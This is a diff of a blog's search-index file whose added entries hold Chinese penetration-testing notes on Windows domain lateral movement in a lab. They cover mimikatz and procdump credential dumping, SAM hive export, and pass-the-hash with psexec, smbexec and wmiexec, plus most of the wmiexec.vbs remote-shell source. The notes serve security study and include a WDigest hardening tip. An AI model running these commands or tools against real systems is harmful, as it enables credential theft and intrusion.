@@ -9,22 +9,6 @@
       </categories>
   </entry>
   <entry>
-    <title>WEB安全系列-[XSS跨站]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>WEB安全系列-[信息收集]</title>
-    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>WEB安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>WEB安全系列-[SQL注入]</title>
     <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BSQL%E6%B3%A8%E5%85%A5%5D/</url>
     <content><![CDATA[<h1><span id="sql注入介绍">SQL注入介绍</span></h1><h3><span id="前言">前言</span></h3><p>SQL注入是比较常见的网络攻击方式之一，它不是利用操作系统的BUG来实现攻击，而是针对程序员编写时的疏忽，通过SQL语句，实现无账号登录，甚至篡改数据库。</p>
@@ -501,6 +485,22 @@
       </categories>
   </entry>
   <entry>
+    <title>WEB安全系列-[XSS跨站]</title>
+    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BXSS%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>WEB安全系列-[信息收集]</title>
+    <url>/2022/04/13/WEB%E5%AE%89%E5%85%A8/WEB%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>WEB安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>WEB靶场系列[sqli-labs]</title>
     <url>/2022/04/13/WEB%E9%9D%B6%E5%9C%BA/WEB%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97%5Bsqli-labs%5D/</url>
     <content><![CDATA[]]></content>
@@ -517,16 +517,8 @@
       </categories>
   </entry>
   <entry>
-    <title>WEB实战系列-[手工获取外网网站登录名和密码]</title>
-    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>实战系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>内网安全系列-[IPC$入侵]</title>
-    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
+    <title>内网安全系列-[ARP欺骗]</title>
+    <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
     <content><![CDATA[<p>22222收入的分第三方</p>
 ]]></content>
       <categories>
@@ -534,8 +526,8 @@
       </categories>
   </entry>
   <entry>
-    <title>内网安全系列-[ARP欺骗]</title>
-    <url>/2022/04/15/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BARP%E6%AC%BA%E9%AA%97%5D%20/</url>
+    <title>内网安全系列-[IPC$入侵]</title>
+    <url>/2022/04/13/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5BIPC$%E5%85%A5%E4%BE%B5%5D/</url>
     <content><![CDATA[<p>22222收入的分第三方</p>
 ]]></content>
       <categories>
@@ -1057,9 +1049,26 @@
       </categories>
   </entry>
   <entry>
+    <title>WEB实战系列-[手工获取外网网站登录名和密码]</title>
+    <url>/2022/04/13/%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97/WEB%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%5B%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%8B%BF%E4%B8%8B%E6%BC%82%E4%BA%AE%E5%9B%BD%E7%BD%91%E7%AB%99%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>实战系列</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小迪安全系列-[基础阶段]</title>
+    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>小迪安全系列-[内网渗透]</title>
     <url>/2022/05/01/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%5D%20/</url>
-    <content><![CDATA[<h1><span id="一-环境amp工作组amp局域网探针方案">一. 环境&amp;工作组&amp;局域网探针方案</span></h1><p>域环境&amp;工作组&amp;局域网探针方案</p>
+    <content><![CDATA[<p>[TOC]</p>
+<h1><span id="一-环境amp工作组amp局域网探针方案">一. 环境&amp;工作组&amp;局域网探针方案</span></h1><p>域环境&amp;工作组&amp;局域网探针方案</p>
 <p>DMZ:把一些不得不向外部提供服务的东西单独放在DMZ中，核心设备才放在内网，一把拿到WEB服务权限之后，还要突破DMZ的防火墙，加大了攻击的难度</p>
 <p><img src="/../../images/xdnwaq/1639281698075.png" alt="1639281698075"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-基本信息收集操作演示<br>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备<br>systeminfo 详细信息<br>net start 启动服务<br>tasklist 进程列表<br>schtasks 计划任务<br></code></pre></td></tr></table></figure>
@@ -1104,7 +1113,7 @@
 
 
 
-<h1><span id="探测存活主机">探测存活主机</span></h1><h2><span id="命令">命令</span></h2><ul>
+<h2><span id="探测存活主机">探测存活主机</span></h2><h2><span id="命令">命令</span></h2><ul>
 <li>系统自带命令探测存活主机</li>
 </ul>
 <p> for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr “TTL&#x3D;” 自带内部命令  </p>
@@ -1117,7 +1126,7 @@
 <p><img src="/../../images/xdnwaq/1639411537057.png" alt="1639411537057"></p>
 <p>有权限</p>
 <p><img src="/../../images/xdnwaq/1639411593003.png" alt="1639411593003"></p>
-<h1><span id="获取密码">获取密码</span></h1><h2><span id="minikatz">Minikatz</span></h2><p>下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
+<h2><span id="获取密码">获取密码</span></h2><h2><span id="minikatz">Minikatz</span></h2><p>下载：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
 <p>1.提权：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # privilege::debug<br>Privilege &#x27;20&#x27; OK<br></code></pre></td></tr></table></figure>
 
@@ -1127,7 +1136,7 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz # sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/xdnwaq/1639809492888.png" alt="1639809492888"></p>
-<h1><span id="域横向atampschtasksampimpacket">域横向at&amp;schtasks&amp;impacket</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-横向渗透明文传递 at&amp;schtasks<br>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？<br>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主<br>机上执行命令。<br>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户<br>名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或<br>者相关命令<br>利用流程<br>1. 建立 IPC 链接到目标主机<br>2. 拷贝要执行的命令脚本到目标主机<br>3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br></code></pre></td></tr></table></figure>
+<h1><span id="二域横向atampschtasksampimpacket">二,域横向at&amp;schtasks&amp;impacket</span></h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#案例 1-横向渗透明文传递 at&amp;schtasks<br>在拿下一台内网主机后，通过本地信息搜集收集用户凭证等信息后，如何横向渗透拿下更多的主机？<br>这里仅介绍 at&amp;schtasks 命令的使用，在已知目标系统的用户明文密码的基础上，直接可以在远程主<br>机上执行命令。<br>获取到某域主机权限-&gt;minikatz 得到密码（明文，hash）-&gt;用到信息收集里面域用户的列表当做用户<br>名字典-&gt;用到密码明文当做密码字典-》尝试连接-&gt;创建计划任务(at|schtasks)-&gt;执行文件可为后门或<br>者相关命令<br>利用流程<br>1. 建立 IPC 链接到目标主机<br>2. 拷贝要执行的命令脚本到目标主机<br>3. 查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本<br></code></pre></td></tr></table></figure>
 
 
 
@@ -1166,17 +1175,85 @@
 <h2><span id="net-use批量连接"><strong>net use批量连接</strong></span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">FOR /F %%i in (ips.txt) do net use \\%%i\ipc$ &quot;Admin12345&quot; /user:administrator<br></code></pre></td></tr></table></figure>
 
 <p><img src="/../../images/xdnwaq/1639590175450.png" alt="1639590175450"></p>
-<h1><span id="内网安全-域横向-smbampwmi-明文或-hash-传递">内网安全-域横向 smb&amp;wmi 明文或 hash 传递</span></h1>]]></content>
+<h1><span id="三域横向-smbampwmi-明文或-hash-传递">三,域横向 smb&amp;wmi 明文或 hash 传递</span></h1><p>知识点1:</p>
+<blockquote>
+<p> <strong>WDigest的问题是它将密码存储在内存中，并且无论是否使用它，都会将其存储在内存中。除非密码以明文保存在内存中，否则WDigest无法正常工作，因此如果使用WDigest，则无法进行修复。以下操作系统受到影响：Windows 7，Windows 8，Windows 8.1，Windows Server 2008，Windows Server 2008R2和Windows Server 2012。</strong> </p>
+</blockquote>
+<blockquote>
+<p><strong>windows2012以上版本默认关闭wdigest，攻击者无法从内存中获取明文密码windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码针对以上情况，我们提供了4种方式解决此类问题</strong></p>
+</blockquote>
+<p>minikatz+procdump： <a href="https://x1aojun.lanzoub.com/b036ytgba">https://x1aojun.lanzoub.com/b036ytgba</a><br>密码:h4kw </p>
+<h2><span id="案例1-procdumpmimikatz-配合获取">案例1-Procdump+Mimikatz 配合获取</span></h2><p> <strong>如果上传Minmiktz上传后被杀,可以使用Procdump+Mimikatz这个方法</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">procdump 配合 mimikatz<br>procdump -accepteula -ma lsass.exe lsass.dmp<br><br>mimikatz 上执行：<br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br>#Pwdump7<br>#QuarksPwdump<br></code></pre></td></tr></table></figure>
+
+<p>一，win7-1运行**<code>procdump -accepteula -ma lsass.exe lsass.dmp</code>**</p>
+<p><img src="/../../images/xdnwaq/1640018929439.png" alt="1640018929439"></p>
+<p>二，win7-2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz 上执行：<br><br>privilege::debug		//提权<br><br>sekurlsa::minidump lsass.dmp<br>sekurlsa::logonPasswords full<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1640019069996.png" alt="1640019069996"></p>
+<h2><span id="案例2-通过sam和system文件抓取密码和hash">案例2 通过SAM和System文件抓取密码和Hash</span></h2><p>一，首先利用注册表命令将目标机的sam或者system文件导出</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">reg save hklm\sam sam.hive<br><br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/16400194670596.png" alt="1640019460596"></p>
+<p>二，然后将目标机上的sam.hive和system.hive下载到本地，利用Mimikatz读取sam和system文件获取NTLMHash：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">token::elevate<br><br>lsadump::sam<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1640019523652.png" alt="1640019523652"></p>
+<p>三，<a href="https://www.objectif-securite.ch/en/ophcrack">https://www.objectif-securite.ch/en/ophcrack</a> <strong>在线破解HASH</strong>(挂了) 再通过以上工具获取到密码Hash后，我们需要对其进行破解，以得到明文密码。Ophcrack网站<a href="https://www.objectif-securite.ch/en/ophcrack%E6%8F%90%E4%BE%9B%E4%BA%86%E5%9C%A8%E7%BA%BFHash%E7%A0%B4%E8%A7%A3%E6%9C%8D%E5%8A%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E5%B0%86%E5%BE%97%E5%88%B0%E7%9A%84NTLM">https://www.objectif-securite.ch/en/ophcrack提供了在线Hash破解服务，我们将得到的NTLM</a> Hash输入到第一个查询框内，点击GO即可进行破解，小于14位的密码一般在几分钟内就可以破解完成： </p>
+<p><img src="/../../images/xdnwaq/1640019667156.png" alt="1640019667156"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">防范措施<br>1、更新补丁<br>微软为了防止用户的明文密码在内存中泄露，发布了KB2871997补丁，关闭了Wdigest功能。Windows Server 2012及以上版本默认关闭Wdigest，使攻击者无法从内存中获取明文密码。Windows Server 2012以下版本，如果安装了KB2871997补丁，攻击者同样无法获取明文密码。<br>2、关闭Wdigest Auth<br>如果无法更新补丁，需要手动关闭Wdigest Auth，在CMD中输入以下命令：<br>reg add HKLM\SYSTEM\CurrentControlSet\<br>Control\SecurityProviders\WDigest /vUseLogonCredential /t REG_DWORD /d0/f //关闭Wdigest Auth<br>需要将UseLogonCredential的值设为0，然后注销当前用户，重新登陆即可。<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2><span id="案例-3-域横向移动-smb-服务利用psexecsmbexec官方自带">案例 3-域横向移动 SMB 服务利用psexec,smbexec(官方自带)</span></h2><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">第一种：先有 ipc 链接，psexec 需要明文或 hash 传递<br>net use \\192.168.3.32\ipc$ &quot;admin&quot; /user:administrator<br>psexec \\192.168.3.32 -s cmd # 需要先有 ipc 链接 -s 以 System 权限运行<br><br>第二种：不用建立 IPC 直接提供明文账户密码<br>psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd<br>psexec -hashes :209c6174da490caeb422f3Fa5a7ae634 ./administrator@192.168.0.2<br>psexec -hashes :$HASH$ domain/administrator@10.1.2.3<br>psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 官方 Pstools 无法<br>采用 hash 连接<br>#非官方自带-参考 impacket 工具包使用，操作简单，容易被杀<br></code></pre></td></tr></table></figure>
+
+
+
+<h2><span id="ps-toolspsexecexe">PS tools——PsExec.exe</span></h2><p><img src="/../../images/xdnwaq/1640021849986.png" alt="1640021849986"></p>
+<h2><span id="impacketsmbexec">impacket——smbexec</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">smbexec 无需先 ipc 链接 明文或 hash 传递<br>smbexec.exe 用户名:密码@目标IP<br>smbexec god/administrator:Admin12345@192.168.3.21<br>smbexec ./administrator:admin!@#45@192.168.3.32<br>smbexec -hashes :$HASH$ ./admin@192.168.3.21<br>smbbexec -hashes :$HASH$ domain/admin@192.168.3.21<br>smbexec -hashes :209c6174da490caeb422f3Fa5a7ae634 ./administrator@192.168.0.2<br>smbexec -hashes :ccef208c6485269c20db2cad21734fe7god/administrator@192.168.3.2<br></code></pre></td></tr></table></figure>
+
+
+
+<p>明文：</p>
+<p><img src="/../../images/xdnwaq/1640021078414.png" alt="1640021078414"></p>
+<p>HASH：<br><img src="F:/%25E6%25A1%258C%25E9%259D%25A2%25E5%259B%25BE%25E6%25A0%2587/%25E7%25AC%2594%25E8%25AE%25B0/%25E5%2586%2585%25E7%25BD%2591%25E5%25AE%2589%25E5%2585%25A8/%25E5%2586%2585%25E7%25BD%2591%25E5%25AE%2589%25E5%2585%25A8-%25E5%259F%259F%25E6%25A8%25AA%25E5%2590%2591%2520smb&wmi%2520%25E6%2598%258E%25E6%2596%2587%25E6%2588%2596%2520hash%2520%25E4%25BC%25A0%25E9%2580%2592.assets/1640021650260.png" alt="1640021650260"></p>
+<h1><span id="四域横向移动-wmi-服务利用-cscriptwmiexecwmic">四,域横向移动 WMI 服务利用-cscript,wmiexec,wmic</span></h1><blockquote>
+<p>WMI(Windows Management Instrumentation) 是通过 135 端口进行利用，支持用户名明文或者 hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>
+</blockquote>
+<h2><span id="wmiexec">wmiexec</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">wmic /node:192.168.0.2 /user:administrator /password:admin process call create &quot;cmd.exe /c ipconfig &gt;C:\1.txt&quot;<br><br>调用cmd.exe 执行ipconfig到靶机C盘的1.txt中<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1640022207860.png" alt="1640022207860"></p>
+<p>自带 cscript 明文传递 有回显<strong>（可过火绒）</strong><br> cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.0.2 administrator admin </p>
+<p><img src="/../../images/xdnwaq/1640022554523.png" alt="1640022554523"></p>
+<h2><span id="impacket-wmiexec">impacket wmiexec</span></h2><p>套件 impacket wmiexec 明文或 hash 传递 有回显 exe 版本</p>
+<p>wmiexec .&#x2F;administrator:<a href="mailto:&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#46;&#x32;">&#97;&#x64;&#x6d;&#x69;&#110;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x30;&#46;&#x32;</a> “whoami”</p>
+<p><img src="/../../images/xdnwaq/1640022650943.png" alt="1640022650943"></p>
+<h2><span id="wmiexec-vbs源码">wmiexec VBS源码：</span></h2><p> <a href="https://x1aojun.lanzoub.com/i2exe046vrji">https://x1aojun.lanzoub.com/i2exe046vrji</a> </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">On Error Resume Next<br>&#x27;################################ Temp Result File , Change it to where you like<br>Const Path = &quot;C:\&quot;<br>Const FileName = &quot;wmi.dll&quot; <br>Const timeOut = 1200<br>&#x27;################################<br>file = Path &amp; &quot;\&quot; &amp; FileName<br>file = Replace(file,&quot;\\&quot;,&quot;\&quot;)<br>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)<br>FilePath = fso.GetParentFolderName(file) &#x27;for wmi create share<br>&#x27;WScript.Echo FilePath<br><br>WAITTIME = timeOut              &#x27;ms  time to execute command ,read result file after 1200ms<br><br>Set objArgs = WScript.Arguments<br>intArgCount = objArgs.Count <br>If intArgCount &lt; 2 Or intArgCount &gt; 5 Then<br>	WScript.Echo <br>	WScript.Echo &quot;   $$\      $$\ $$\      $$\ $$$$$$\ $$$$$$$$\ $$\   $$\ $$$$$$$$\  $$$$$$\  &quot;<br>	WScript.Echo &quot;   $$ | $\  $$ |$$$\    $$$ |\_$$  _|$$  _____|$$ |  $$ |$$  _____|$$  __$$\ &quot;<br>	WScript.Echo &quot;   $$ |$$$\ $$ |$$$$\  $$$$ |  $$ |  $$ |      \$$\ $$  |$$ |      $$ /  \__|&quot;<br>	WScript.Echo &quot;   $$ $$ $$\$$ |$$\$$\$$ $$ |  $$ |  $$$$$\     \$$$$  / $$$$$\    $$ |      &quot;<br>	WScript.Echo &quot;   $$$$  _$$$$ |$$ \$$$  $$ |  $$ |  $$  __|    $$  $$&lt;  $$  __|   $$ |      &quot;<br>	WScript.Echo &quot;   $$$  / \$$$ |$$ |\$  /$$ |  $$ |  $$ |      $$  /\$$\ $$ |      $$ |  $$\ &quot;<br>	WScript.Echo &quot;   $$  /   \$$ |$$ | \_/ $$ |$$$$$$\ $$$$$$$$\ $$ /  $$ |$$$$$$$$\ \$$$$$$  |&quot;<br>	WScript.Echo &quot;   \__/     \__|\__|     \__|\______|\________|\__|  \__|\________| \______/ &quot;<br>	WScript.Echo &quot;                                               v1.1dev        By. Twi1ight   &quot;<br>	WScript.Echo &quot; Usage:&quot; &amp; _<br>					vbTab &amp; &quot;wmiexec.vbs  /shell  host&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /shell  host  user  pass&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /cmd  host  command&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;wmiexec.vbs  /cmd  host  user  pass  command&quot; &amp; vbNewLine &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  /shell&quot;  &amp; vbTab &amp; &quot;half-interactive shell mode&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  /cmd&quot; &amp; vbTab &amp; vbTab &amp; &quot;single command mode&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  host&quot; &amp; vbTab &amp; vbTab &amp; &quot;hostname or IP address&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  command&quot; &amp; vbTab &amp; &quot;the command to execute on remote host&quot; &amp; _<br>		vbNewLine &amp; vbNewLine &amp; vbTab &amp; &quot;  -waitTIME&quot; &amp; vbTab &amp; _<br>		 &quot;[both mode] ,delay TIME to read result,&quot;&amp; vbNewLine &amp; vbTab &amp; _<br>		 vbTab &amp; vbTab &amp;&quot;eg. &#x27;systeminfo -wait5000&#x27; &#x27;ping google.com -wait2000&#x27;&quot; &amp; _<br>		vbNewLine &amp; vbTab &amp; &quot;  -persist&quot; &amp; vbTab &amp; _<br>		 &quot;[both mode] ,running command background and persistent&quot; &amp; vbNewLine &amp; vbTab &amp; _<br>		 vbTab &amp; vbTab &amp;&quot;such as nc.exe or Trojan&quot; <br>	WScript.Quit()<br>End If<br><br>If LCase(objArgs.Item(0)) &lt;&gt; &quot;/cmd&quot; And LCase(objArgs.Item(0)) &lt;&gt; &quot;/shell&quot; Then <br>	WScript.Echo &quot;WMIEXEC ERROR: Wrong Mode Specified!&quot;<br>	WScript.Quit<br>End If<br>boolShellMode = True<br>If LCase(objArgs.Item(0)) = &quot;/cmd&quot; Then boolShellMode = False<br>If boolShellMode = False Then command = objArgs.Item(intArgCount - 1)<br><br>host = objArgs.Item(1)<br>If intArgCount &gt; 3 Then <br>	user = objArgs.Item(2)<br>	pass = objArgs.Item(3)<br>	Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>	strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; &quot;&quot;&quot; &amp; pass &amp; &quot;&quot;&quot; &quot; &amp; &quot;/user:&quot; &amp; user<br>	&#x27;WScript.Echo strNetUse<br>	objShell.Run strNetUse,0<br>End If<br>&#x27;Output Status<br>WScript.Echo &quot;WMIEXEC : Target -&gt; &quot; &amp; host<br>WScript.Echo &quot;WMIEXEC : Connecting...&quot;<br><br>Set objLocator = CreateObject(&quot;wbemscripting.swbemlocator&quot;)<br>If intArgCount &gt;2 Then<br>	set objWMIService = objLocator.connectserver(host,&quot;root/cimv2&quot;,user,pass)<br>Else<br>	Set objWMIService = objLocator.ConnectServer(host,&quot;root/cimv2&quot;)<br>End If<br>If Err.Number &lt;&gt; 0 Then<br>	WScript.Echo &quot;WMIEXEC ERROR: &quot; &amp; Err.Description <br>	WScript.Quit<br>End If<br>WScript.Echo &quot;WMIEXEC : Login -&gt; OK&quot;<br>WScript.Echo &quot;WMIEXEC : Result File -&gt; &quot; &amp; file<br><br>boolPersist = False<br>&#x27;Create Share<br>CreateShare()<br>CurrentFolder = Null<br>&#x27;-----single Command mode------<br>If boolShellMode = False Then<br>	WAITTIME = 5000<br>	WScript.Echo vbNewLine &amp; vbTab &amp; host &amp; &quot;  &gt;&gt;  &quot; &amp; command<br>	boolGetFolder = False<br>	strResult = PhraseCmd( command )<br>	&#x27;WScript.Echo strResult<br>	If strResult = &quot;persist&quot; Then<br>		boolPersist = True<br>		Exec command,&quot;nul&quot;<br>	Else<br>		Exec command, file<br>		ReadResult()<br>	End If<br>	If intArgCount &gt; 3 Then <br>		Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>		strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; /del&quot;<br>		objShell.Run strNetUse,0<br>	End If<br>	DeleteShare()<br>	WScript.Quit<br>End If<br>&#x27;------------------------------<br><br>&#x27;++++++++shell mode++++++++++++<br>&#x27;get current working directory<br>boolGetFolder = True<br>CurrentFolder = Exec(&quot;cd&quot;, file)<br><br>&#x27;WScript.Echo CurrentFolder<br>Do While True<br>	boolPersist = False<br>	WAITTIME = timeOut<br>	wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)<br>	command = wscript.stdin.ReadLine<br>	&#x27;press &#x27;Enter&#x27; directorly<br>	Do While command = &quot;&quot;<br>		wscript.stdout.write(CurrentFolder &amp; &quot;&gt;&quot;)<br>		command = wscript.stdin.ReadLine<br>	Loop<br>	If LCase(Trim(command)) = &quot;exit&quot; Then Exit Do<br>	&#x27;If Not IsEmpty(command) Then <br>	&#x27;process &#x27;cd&#x27; command--------&gt;&gt;&gt;&gt;<br>	strResult = PhraseCmd( command )<br>	If strResult = &quot;cd&quot; Then <br>		command = command &amp; &quot; &amp; cd &quot;<br>		boolGetFolder = True<br>		DestFolder = Exec(command, file)<br>		If CurrentFolder = DestFolder Then <br>			WScript.Echo &quot;The system cannot find the path specified.&quot;<br>		Else<br>			CurrentFolder = DestFolder<br>		End If<br>	ElseIf strResult = &quot;persist&quot; Then<br>		boolPersist = True<br>		&#x27;WScript.Echo &quot;persist&quot;<br>		Exec command,&quot;nul&quot;<br>		&#x27;##########################################toDo<br>	&#x27;-----------&lt;&lt;&lt;&lt;<br>	Else<br>		On Error Resume Next<br>		err.clear<br>		Exec command, file<br>		ReadResult()<br>	    If err.number &lt;&gt; 0 Then wscript.echo( &quot;WMIEXEC ERROR: &quot; &amp; Err.Number &amp; &quot; &quot; &amp; err.description)<br>		Err.Clear<br>	    On Error Goto 0<br>	End If<br>loop<br><br>strDelFile = &quot;del &quot; &amp; file &amp; &quot; /F&quot;<br>Exec strDelFile,&quot;nul&quot;<br>If intArgCount &gt; 3 Then <br>	Set objShell = CreateObject(&quot;WScript.Shell&quot;)<br>	strNetUse = &quot;cmd.exe /c net use \\&quot; &amp; host &amp; &quot; /del&quot;<br>	objShell.Run strNetUse,0<br>End If<br>DeleteShare()<br><br>&#x27;#####################################<br>Function PhraseCmd(cmd)<br>	PhraseCmd = False &#x27; not &#x27;cd&#x27;<br>	arrCommand = Split(cmd)<br>	strExe = arrCommand(0)<br>	If LCase(Trim(strExe)) = &quot;cd&quot; Or LCase(Trim(strExe)) = &quot;cd.exe&quot; Then PhraseCmd = &quot;cd&quot;  &#x27; is &#x27;cd&#x27;<br>	Set regEx = New RegExp<br>	regEx.Pattern = &quot;^[a-z]:$&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then PhraseCmd = &quot;cd&quot; &#x27; is &#x27;d:&#x27;<br>	&#x27;phrase time command<br>	regEx.Pattern = &quot;(.*?)-wait(\d+)&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then <br>		Set objMatch = Matches(0)<br>		command = objMatch.SubMatches(0)<br>		&#x27;WScript.Echo &quot;Command :&quot; &amp; command<br>		WAITTIME = CInt(objMatch.SubMatches(1))<br>		WScript.Echo &quot;WMIEXEC : Waiting &quot; &amp; WAITTIME &amp; &quot; ms...&quot; &amp; vbNewLine<br>	End If<br>	&#x27;phrase persist command<br>	regEx.Pattern = &quot;(.*?)-persist&quot;<br>	regEx.IgnoreCase = True<br>	Set Matches = regEx.Execute(cmd)<br>	If Matches.Count &lt;&gt; 0 Then <br>		Set objMatch = Matches(0)<br>		command = objMatch.SubMatches(0)<br>		PhraseCmd = &quot;persist&quot;  &#x27; is quiet<br>	End If<br>End Function<br><br>Function CreateShare()<br>	&#x27;create share<br>	Set objNewShare = objWMIService.Get(&quot;Win32_Share&quot;)<br>	intReturn = objNewShare.Create _<br>	    (FilePath, 